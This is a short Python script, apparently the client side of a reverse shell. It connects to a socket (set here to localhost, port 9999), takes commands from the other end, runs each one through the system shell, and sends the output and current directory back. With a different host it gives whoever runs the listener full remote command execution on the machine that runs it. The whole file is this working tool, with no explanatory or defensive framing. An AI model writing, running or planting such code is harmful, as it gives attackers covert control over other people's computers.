import socket
import os
import subprocess


socket = socket.socket()
host = "localhost"
port = 9999

socket.connect((host, port))

while True:
    data = socket.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdin=subprocess.PIPE,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, 'utf-8')
        current_directory = os.getcwd() + "> "
        socket.send(str.encode(output_str + current_directory))

        print(output_str)

